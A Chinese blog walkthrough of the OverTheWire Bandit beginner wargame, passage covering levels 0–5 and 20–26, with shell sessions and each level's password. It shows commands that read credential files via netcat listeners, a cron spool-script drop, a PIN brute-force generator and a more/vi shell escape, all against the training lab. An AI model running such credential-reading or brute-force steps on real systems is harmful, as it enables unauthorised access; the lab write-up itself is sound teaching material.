这个命令，先查一下这个命令。然后再看会好很多。\n嗯……先给你3分钟查一查，不够的话再来3分钟也行……\n\n![IMAGE](/Image/bandit_resources/9D5E08F5F93CA44BC4287F54BD6661FC.jpg)\n拿实际例子来说，当我们这样配置并连接的时候，我们请求连接本地主机的 1234 端口时这个请求会转发到 `bandit.labs.overthewire.org`，它会来访问 `localhost` (此时，对于 `bandit.labs.overthewire.org` 来讲 `localhost` 是它自身)的 22 端口。\n注意事项中告诉我们，这样就可以在提供 -L 参数的这个连接不关闭的情况下，通过本地端口转发，建立另一条连接并能够与前一个连接搞基。\n\n那我们的第二个连接就是这样的：\n![IMAGE](/Image/bandit_resources/CA9CFE5E31145E899BB4D6AD535E8B21.jpg)\n\n我们在其中一个终端中创建一个发送本关密码的监听：\n```bash\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20\n \n```\n此时光标会在第二行等待，监听命令没有执行完毕退出。\n我们在第二个终端中，我们来看看他所说的这个程序：\n```bash\nbandit20@bandit:~$ ll\ntotal 28\ndrwxr-xr-x  2 root     root     4096 Nov 13 15:58 ./\ndrwxr-xr-x 29 root     root     4096 Nov 13 15:57 ../\n-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout\n-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc\n-rw-r--r--  1 root     root      655 Jun 24  2016 .profile\n-rwsr-x---  1 bandit21 bandit20 8044 Nov 13 15:58 suconnect*\nbandit20@bandit:~$ ./suconnect \nUsage: ./suconnect <portnumber>\nThis program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.\n# 嗯 上面的报道基本没什么偏差…… 我们来运行一下，端口号是我们上面自定义的监听端口「23333」\nbandit20@bandit:~$ ./suconnect 23333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n# 程序告诉我们，他读到了我们发送给他的密码「GbKksEFF4yrVs6il55v6gwY5aVje5f0j」，密码抱对成功，下一关的密码已发送。\n```\n那我们再来看一眼监听的那一边：\n```bash\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20 # 这条是我们之前的\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr #收到了密码\nbandit20@bandit:~$ # 出现了它，表示 nc 命令结束了执行。\n```\n\n### 思路二：\n这个思路其实我之前叙述的时候已经透露出一些味道了，细心的应该已经不用我说了。\n关键词「&」。\n这道题创建两个终端去连接的根本原因是因为监听和执行会占用两个终端，那我们把监听扔到后台去跑不就解决了吗。\n连接姿势为正常姿势不多说……算了还是多说个j8（图）吧：\n![IMAGE](/Image/bandit_resources/7BBE68BB3C0BC4EC581DB35ABD35E039.jpg)\n\n```bash\n# 放在后台执行\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20 & \n# 后台运行进程代号[1]，PID 为 1135 \n[1] 1135\nbandit20@bandit:~$ ./suconnect 23333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n# 后台进程返回了得到的信息（密码）到标准输出（你当前的终端）\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n# 后台进程运行结束，命令为：nc -l 23333 < /etc/bandit_pass/bandit20\n[1]+  Done                    nc -l 23333 < /etc/bandit_pass/bandit20\nbandit20@bandit:~$ \n```\n\n心路历程：嗯，先说思路一的理由是我怕我先写思路二，再写的思路一可能没人看了。\n\nLevel 21 - 22\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。\n\n密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n\n```sh\n# 进入描述中的文件夹\nbandit21@bandit:~$ cd /etc/cron.d/\nbandit21@bandit:/etc/cron.d$ ll\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 13 15:58 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\n# 不要问我为什么，就是直觉\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n# 他会跑这个脚本，那我们去看看\nbandit21@bandit:/etc/cron.d$ cat -n /usr/bin/cronjob_bandit22.sh\n     1  #!/bin/bash\n     2  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n     3  cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n# 他会往这个脚本里跑内容\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n```\n\n心路历程：甚至不需要知道他所说的 cron 是干什么的，我们就能找到密码（当然，游戏放水也有很大因素）。不过该知道的还是要知道的，cron 是 Linux 的守护进程。通俗一点就是我们平时接触到的计划任务，按照规定时间安排定期执行动作的。其中的 cronjob\\_bandit\\* 就是提供给 cron 执行的文件。「\\* \\* \\* \\* \\* bandit22 /usr/bin/cronjob\\_bandit22.sh &\\> /dev/null」前面的「\\*」是每分钟执行一次，「bandit22」是用它的身份执行，「/usr/bin/cronjob\\_bandit22.sh」是被执行脚本，至于「&\\> /dev/null」 前面都有分别提到过，不说任性。\n\n---\n\nLevel 22 - 23\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本是故意易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看打印的调试信息。\n\n密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n```sh\nbandit22@bandit:~$ ll /etc/cron.d\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 13 15:58 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\nbandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23\n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\nbandit22@bandit:~$ cat -n /usr/bin/cronjob_bandit23.sh\n     1  #!/bin/bash\n     2\n     3  myname=$(whoami)\n     4  mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n     5\n     6  echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n     7\n     8  cat /etc/bandit_pass/$myname > /tmp/$mytarget\n\ncat /etc/bandit_pass/$myname > /tmp/$mytarget\nbandit22@bandit:~$ myname=\"bandit23\"\nbandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\nbandit22@bandit:~$ echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\nCopying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349\nbandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n```\n\n心路历程：这里的定位思路与上一关没什么区别，最后会要你分析这个简单的代码。因为 cronjob\\_bandit23 文件中指定的用户是 bandit23，whoami 的结果也是这个，我们就直接赋值然后走流程就行了。\n\n---\n\nLevel 23 -24\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 \n\n注意：这个级别要求你创建你自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到骄傲！ \n\n注意2：请记住，你的shell脚本一旦执行就会被删除，所以你可能想保留一个副本...\n\n密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n\n```sh\nbandit23@bandit:/var/spool/bandit24$ ll /etc/cron.d\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 16 10:18 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\nbandit23@bandit:/var/spool/bandit24$ cat /etc/cron.d/cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\nbandit23@bandit:/var/spool/bandit24$ cat -n /usr/bin/cronjob_bandit24.sh\n     1  #!/bin/bash\n     2\n     3  myname=$(whoami)\n     4\n     5  cd /var/spool/$myname\n     6  echo \"Executing and deleting all scripts in /var/spool/$myname:\"\n     7  for i in * .*;\n     8  do\n     9      if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    10      then\n    11          echo \"Handling $i\"\n    12          timeout -s 9 60 ./$i\n    13          rm -f ./$i\n    14      fi\n    15  done\nbandit23@bandit:/var/spool/bandit24$ echo \"cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass\" > /var/spool/bandit24/bandit24_getpwd ; chmod 777 bandit24_getpwd ; chmod 777 /tmp/bandit24_pass\nbandit23@bandit:/var/spool/bandit24$ cat chmod 777 /tmp/bandit24_pass\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n```\n\n心路历程：我们定位脚本的思路不变，看脚本发现：该脚本会执行 `/var/spool/bandit24` 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 `/etc/bandit\\_pass/bandit24/` 输出到 /tmp/bandit24\\_pass 的脚本到这个目录下，然后付了个权限。\n\n---\n\nLevel 24 - 25\n\n描述：一个守护进程正在监听端口30002，如果给出了bandit24的密码和一个秘密的数字4位pincode，将给你bandit25的密码。没有办法检索pincode，除非枚举10000个组合，称为蛮力。\n\n密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n```sh\nbandit24@bandit:~$ vim /tmp/boom.py\nbandit24@bandit:~$ cat -n /tmp/boom.py\n     1  #!/usr/bin/env python\n     2\n     3  fl = open('/tmp/boom_dict.txt', 'w+')\n     4  pwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'\n     5  for i in xrange(10000):\n     6      fl.write(pwd + ' ' + str(i).zfill(4) + '\\n')\n     7  fl.close()\n     8\nbandit24@bandit:~$ python /tmp/boom.py\nbandit24@bandit:~$ head /tmp/boom_dict.txt\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009\nbandit24@bandit:~$ nc localhost 30002 < /tmp/boom_dict.txt > /tmp/reply_pwd.txt\nbandit24@bandit:~$ sort /tmp/reply_pwd.txt | uniq -u\n\nCorrect!\nExiting.\nI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n```\n\n心路历程：这关描述也很清晰（虽然我是机翻）。它开放了一个 30002 端口监听，你给他发 bandit24 的密码 +空格 + 四位数字，如果这个字符串正确它就会返回给你 bandit25 的密码。 Bandit24 的密码我们很容易得到，那问题就是这个4位数了。描述中说我们只能尝试暴力破解，那就从「0001」到「9999」都生成出来，分别与 bandit24的密码+空格连接，把这一万个组合都试一下。于是写了一个 python 脚本生成这个含有 10000 种组合的文件，并提交给 30002 端口，把返回的信息存放在文件中，然后筛选文件内正确信息。\n\n---\n\nLevel 25 - 26\n\n描述：从bandit25登录到bandit26应该相当简单...用户bandit26的shell不是/ bin / bash，而是别的。找出它是什么，它是如何工作的，以及如何摆脱它。\n\n密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n\n```bash\nbandit25@bandit:~$ ls\nbandit26.sshkey\nbandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost        \nCould not create directory '/home/bandit25/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:rm2/oZ03et2au9vHBOtBNdgMDGJkbNqdkmHDLPDD32E.\nAre you sure you want to continue connecting (yes/no)? yes\n | |                   | (_) | |__ \\ / /  \n | |__   __ _ _ __   __| |_| |_   ) / /_  \n | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ \n | |_) | (_| | | | | (_| | | |_ / /| (_) |\n |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ \nConnection to localhost closed.\nbandit25@bandit:~$  \n# ssh 连接以后把我提出来了。。。\n# 题目提示 bandit26 的 shell 不是 /bin/bash，那我们看看是什么\nbandit25@bandit:~$ cat /etc/passwd | grep bandit26\nbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext\nbandit25@bandit:~$ cat -n /usr/bin/showtext\n     1  #!/bin/sh\n     2\n     3  export TERM=linux\n     4\n     5  more ~/text.txt\n     6  exit 0\n# more 命令是一次显示一屏文字，然后左下角会显示一个 more 和当前显示了百分之多少\n# 我们在回头看看上面登陆后的字符画：\n# | |                   | (_) | |__ \\ / /  \n# | |__   __ _ _ __   __| |_| |_   ) / /_  \n# | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ \n# | |_) | (_| | | | | (_| | | |_ / /| (_) |\n# |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ \n# 之前在其他登陆中不曾见过，想必就是 more 命令显示的 text.txt 的内容\n# 因为行数足以一屏显示完，所以没有显示 more 就没有显示\n# 我们的思路就在 more 的这个特点上。我们要让他卡在一屏读不完的位置，也就是让你的终端高度读不下6行（字符画高度）。\n# 这样我们可以在 more 的状态下通过一些特性执行命令找到我们下一关的密码。\n# 因为上面的字符画有6行，而使用 chrome 没办法变那么窄，我们转而使用系统的命令行 ssh 上去搞。\n```\n我们先连接上去\n![IMAGE](/Image/bandit_resources/9E633BCC3C0A9193B0E8E2C2B65731BA.jpg)\n然后我们使用 bandit25 这个用户带着 bandit26 的 privatekey 去连接 bandit26\n![IMAGE](/Image/bandit_resources/D9A392F2C38EC45B17ACAAB75A5E3890.jpg)\nmore 命令像预期一样输出一屏后等待我们的动作：\n![IMAGE](/Image/bandit_resources/E02BACB49695839AC213BC250033CBDE.jpg)\n我们看看手册，有没有能我们需要的东西：\n![IMAGE](/Image/bandit_resources/A821D5D2B3FBEF8E79E26DE69CA97891.jpg)\n这个v命令能让我们进入 vi 模式，虽然不常用 vi，但经常 vim 敲代码，经常使用「:sp」「:vsp」这种能打开其他文件的命令。\n我们再去看看 vi 的 man 手册：\n![IMAGE](/Image/bandit_resources/06367F7F7B9D0A55C16D0B51300F9A4B.jpg)\n看起来就是我们需要的命令，那我们去试试。\n在 more 的页面按v进入vi\n![IMAGE](/Image/bandit_resources/FDDCDF1F1AA31D4A681D965AB9B27E74.jpg)\n然后使用命令 `:ex! /etc/bandit_pass/bandit26` 打开我们需要的密码文件：\n![IMAGE](/Image/bandit_resources/DDF96BC0FFF6CC6F41E8694DBDC1CE1E.jpg)\n\n心路历程：这关很有意思，刚好 more 与 vi 这两个命令我都不常用，查阅文档与测试了一番。诸如登陆时候的字符画与 more 这种小细节，透过终端似乎能在看到设计者的：）\n\n---\n\nLevel 26 - 27\n\n描述：**这时候，27级还不存在**\n\n[Game Over]\n\n---\n\n嗯……游戏是结束了，我最后问一句：\n![IMAGE](/Image/bandit_resources/00023D502683EF1B4545C5273153F690.jpg)","slug":"WarGame_Bandit","published":1,"updated":"2017-11-17T13:49:04.000Z","photos":[],"link":"","_id":"cjh9h0k8c000emkwbmzi0m3wg","content":"<p>这次安利一个游戏。<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div></pre></td></tr></table></figure></p>\n<p>游戏呢是给初学者设计的，新手刚好可以一边过关一边学习一些 Linux 的基本操作。<br>先说说这个游戏怎么玩吧：<br>我们这个游戏有27关，对应27对账号密码组合。开始的时候送我们一个第一关的账号密码：「bandit0」-「bandit0」。<br>我们需要使用这个账号登陆服务器并找到「bandit1」的密码，然后使用得到的密码登陆「bandit1」，再找到「bandit2」的密码……</p>\n<p>咦，等一下，这游戏怎么有种……「你追我，如果你追到我，我就让你嘿嘿嘿」的感觉呢……<br><a id=\"more\"></a><br>然而通关以后冰冷的现实告诉我：<br><img src=\"/Image/bandit_resources/27CB93E553A707C15C1AB4DCFA52EFBA.jpg\" alt=\"\"><br>……</p>\n<p>游戏呢，是需要自己动手玩的，这篇文章只是记录了我的通关思路和过程，可以参考，但也别无脑拷。<br>下面的通关记录是在玩游戏的过程中边玩边记录的，所以比较正经，想上车的同学可以下车了～<br>前几关写的比较细，也是考虑到新手一上来就看不懂很闹心，然后又要浪费蛋白质，嗯你懂的：）</p>\n<p>如果有好的思路，欢迎留言。</p>\n<h1 id=\"Bandit-游戏规则\"><a href=\"#Bandit-游戏规则\" class=\"headerlink\" title=\"Bandit 游戏规则\"></a>Bandit 游戏规则</h1><p>强盗战争是针对绝对的初学者。它会教授需要能够玩其他战争游戏的基础知识。</p>\n<p>……（剩下不翻译了，懒～</p>\n<p>Level 0 </p>\n<p>两种姿势：1.终端直接 ssh 。2.看下面</p>\n<p>Chrome 插件 「Secure Shell」</p>\n<p><img src=\"/Image/bandit_resources/851073B8A9CDFA81ECB4F7719C7BDA39.jpg\" alt=\"\"></p>\n<p>按上图配置好各项后按「Enter」或点击「连接」</p>\n<p><img src=\"/Image/bandit_resources/608E268171D41C5563D62EA2F9F30FDE.jpg\" alt=\"\"></p>\n<p>输入页面中告诉我们的密码：bandit0</p>\n<p>（输入密码时是隐式输入，光标不会动，不要以为卡了，正常输入后按回车等待反馈信息就好）</p>\n<p><img src=\"/Image/bandit_resources/BE3283D120238F44FADC24C8EA3F5CB8.jpg\" alt=\"\"></p>\n<p>见到这个东西就证明我们使用 SSH 连接服务器成功了。我们就可以用手中的这台电脑操作这台服务器了。</p>\n<hr>\n<p>Level 0 - 1</p>\n<p>描述：下一级别的密码存储在位于主目录中的名为readme的文件中。使用此密码 SSH 登录到bandit1。<br>密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit0@bandit:~$ ls</div><div class=\"line\">readme</div><div class=\"line\">bandit0@bandit:~$ cat readme</div><div class=\"line\">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</div></pre></td></tr></table></figure>\n<p>心路历程：借上图中的红框，「~」表明我们登陆后的当前位置是该用户的主目录，<code>ls</code> 列出当前目录下的文件，发现确实有这个「readme」文件。使用 <code>cat</code> 命令打印出文件的内容。<br>拿到这个所谓的密码之后，我们要使用 exit 命令退出这次登陆（直接刷新网页更快～）。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit0@bandit:~$ <span class=\"built_in\">exit</span> </div><div class=\"line\"><span class=\"built_in\">logout</span></div><div class=\"line\">Connection to bandit.labs.overthewire.org closed.</div><div class=\"line\">NaCl 插件已退出，状态代码为：0。</div><div class=\"line\">重新连接(&amp;R)、选择其他连接(&amp;C)或退出(&amp;E)</div></pre></td></tr></table></figure>\n<p>这时我们输入 C，然后配置新的连接，使用新的用户名「bandit1」和密码「boJ9jbbUNNfktd78OOpsqOltutMc3MY1」登陆就ok了。<br>提示：如果大家不知道去哪里查找命令的话，可以在终端中 <code>man 命令</code>，例如 <code>man ls</code>。天生英文抗性为负的朋友可以来这里查👉<a href=\"http://man.linuxde.net/\" target=\"_blank\" rel=\"external\">Linux 命令大全</a>，但并不能完全取代 man 手册。</p>\n<hr>\n<p>Level 1 - 2</p>\n<p>描述：下一级别的密码存储在一个名为 - 位于主目录中的文件中。</p>\n<p>密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit1@bandit:~$ ls</div><div class=\"line\">-</div><div class=\"line\">bandit1@bandit:~$ cat ./-</div><div class=\"line\">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</div></pre></td></tr></table></figure>\n<p>心路历程：文件名是「-」，如果是其他名字直接 <code>cat filename</code> 就好了，然而如果是 <code>cat -</code> 的话，就有一些小问题，因为 bash 中会用「-」来接受命令行参数，未避免冲突，我们使用「./」来表示当前目录，那「-」文件就表示为「./-」。</p>\n<hr>\n<p>Level 2 - 3</p>\n<p>描述：下一级别的密码存储在位于主目录中的文件名含有「空格」的文件中</p>\n<p>密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit2@bandit:~$ ls</div><div class=\"line\">spaces <span class=\"keyword\">in</span> this filename</div><div class=\"line\">bandit2@bandit:~$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x  3 bandit2 bandit2 4096 Nov 10 15:23 ./</div><div class=\"line\">drwxr-xr-x 30 root    root    4096 Nov 10 15:23 ../</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit2 bandit2 4096 Nov 10 15:23 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2  675 Apr  9  2014 .profile</div><div class=\"line\">-rw-r-----  1 bandit3 bandit2   33 Sep 28 14:04 spaces <span class=\"keyword\">in</span> this filename</div><div class=\"line\">bandit2@bandit:~$ cat spaces\\ <span class=\"keyword\">in</span>\\ this\\ filename </div><div class=\"line\">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</div></pre></td></tr></table></figure>\n<p>心路历程：这关使用 <code>ls</code> 后没办法确定文件的数量（1～4个），使用 <code>ll</code> 命令（<code>ls -alF</code>）查看一下发现是一个单独的文件（「.」开头的文件为隐藏文件，故之前没有显示）。这里的空格面临的情况跟之前的「-」差不多，避免混淆，使用「\\ 」（斜线后跟空格表示空格）。<br>提示：<code>ll</code> 并不是 linux 的基本命令，而是「.bashrc」这个文件中的<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">alias</span> ll=<span class=\"string\">'ls -alF'</span></div></pre></td></tr></table></figure></p>\n<p>这句话定义的。相当于对 <code>ls -alF</code> 这个命令起了一个别名。<br>因为这个别名的定义较为普遍，所以我没看这个文件内容之前就习惯性的试了下。</p>\n<hr>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit3@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit3@bandit:~$ <span class=\"built_in\">cd</span> inhere </div><div class=\"line\">bandit3@bandit:~/inhere$ ls</div><div class=\"line\">bandit3@bandit:~/inhere$ ll</div><div class=\"line\">total 12</div><div class=\"line\">drwxr-xr-x 2 root    root    4096 Sep 28 14:04 ./</div><div class=\"line\">drwxr-xr-x 4 bandit3 bandit3 4096 Nov 10 15:42 ../</div><div class=\"line\">-rw-r----- 1 bandit4 bandit3   33 Sep 28 14:04 .hidden</div><div class=\"line\">bandit3@bandit:~/inhere$ cat .hidden </div><div class=\"line\">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</div></pre></td></tr></table></figure>\n<p>心路历程：进入「inhere」目录后使用 <code>ls</code> 命令看不到非隐藏文件，我们使用 <code>ll</code> 就ok了。</p>\n<hr>\n<p>Level 4 -5</p>\n<p>描述：下一级别的密码存储在inhere目录中唯一的人类可读文件中。提示：如果你的终端搞砸了，试试“重置”命令。</p>\n<p>密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit4@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit4@bandit:~$ <span class=\"built_in\">cd</span> inhere</div><div class=\"line\">bandit4@bandit:~/inhere$ ls</div><div class=\"line\">-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09</div><div class=\"line\">bandit4@bandit:~/inhere$ file ./*</div><div class=\"line\">./-file00: Non-ISO extended-ASCII text, with CR line terminators, with escape sequences</div><div class=\"line\">./-file01: data</div><div class=\"line\">./-file02: data</div><div class=\"line\">./-file03: data</div><div class=\"line\">./-file04: data</div><div class=\"line\">./-file05: data</div><div class=\"line\">./-file06: data</div><div class=\"line\">./-file07: ASCII text</div><div class=\"line\">./-file08: data</div><div class=\"line\">./-file09: data</div><div class=\"line\">bandit4@bandit:~/inhere$ cat ./-file07</div><div class=\"line\">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</div></pre></td></tr></table></figure>\n<p>心路历程：因为描述中提到了这个文件是唯一人类可读的文件，大概率会与其他文件不太一样，我们选择使用 <code>file</code> 命令查看文件类型后发现只有一个 「ASCII text」文件，那基本就是它了。</p>\n<hr>\n<p>Level 5 - 6</p>\n<p>描述：下一级别的密码存储在inhere目录下的某个文件中，并具有以下所有属性： 人类可读，大小为1033字节，不可执行。</p>\n<p>密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit5@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit5@bandit:~$ <span class=\"built_in\">cd</span> inhere; ll</div><div class=\"line\">total 88</div><div class=\"line\">drwxr-x--- 22 root    bandit5 4096 Sep 28 14:04 ./</div><div class=\"line\">drwxr-xr-x  4 bandit5 bandit5 4096 Nov 11 06:01 